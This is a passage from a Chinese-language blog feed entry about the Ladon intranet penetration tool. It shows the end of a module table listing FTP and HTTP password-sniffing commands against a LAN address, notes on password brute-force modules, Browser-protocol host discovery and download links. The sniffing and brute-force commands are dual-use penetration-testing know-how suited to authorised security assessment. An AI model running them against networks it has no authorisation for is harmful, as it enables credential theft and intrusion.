域机器IP</td></tr><tr><td>27</td><td>FtpSniffer</td><td>Ftp密码嗅探</td><td>FTP</td><td>Ladon FtpSniffer 192.168.1.8</td></tr><tr><td>28</td><td>HttpSniffer</td><td>HTTP密码嗅探</td><td>HTTP</td><td>Ladon HTTPSniffer 192.168.1.8</td></tr></tbody></table><p>PS: Ladon 6.2开始密码爆破模块，在无帐密文件的情况下，仅探测协议或对应端口<br>当然所有密码爆破均可自定义端口爆破，但自定义端口可能只支持一台不支持批量<br>具体看Ladon对应模块的详细文档,嗅探模块嗅探出HTTP或FTP帐密同时也证明其存活</p><h3 id="Browser协议"><a href="#Browser协议" class="headerlink" title="Browser协议"></a>Browser协议</h3><p>无意发现browser协议中含有机器名、系统版本,发包时间随机，有些2-12分钟<br>除了上述方法外，Browser协议也可以用于探测存活主机，不过是基于嗅探<br>基于Browser协议探测内网主机，详见：<a href="http://k8gege.org/p/16b5ff0b.html">http://k8gege.org/p/16b5ff0b.html</a></p><h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;&lt;img alt=&quot;image&quot; data-original=&quot;http://k8gege.org/k8img/Ladon/exe/OnlinePC6.2.png&quot;&gt;&lt;/p&gt;
-&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; titl
-      
-    
-    </summary>
-    
-    
-      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
-    
-      <category term="主机发现" scheme="http://k8gege.org/categories/OnlinePC/"/>
-    
-      <category term="内网渗透" scheme="http://k8gege.org/categories/Lan-Pentest/"/>
-    
-      <category term="信息收集" scheme="http://k8gege.org/categories/Discover/"/>
-    
-    
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
     
   </entry>
   
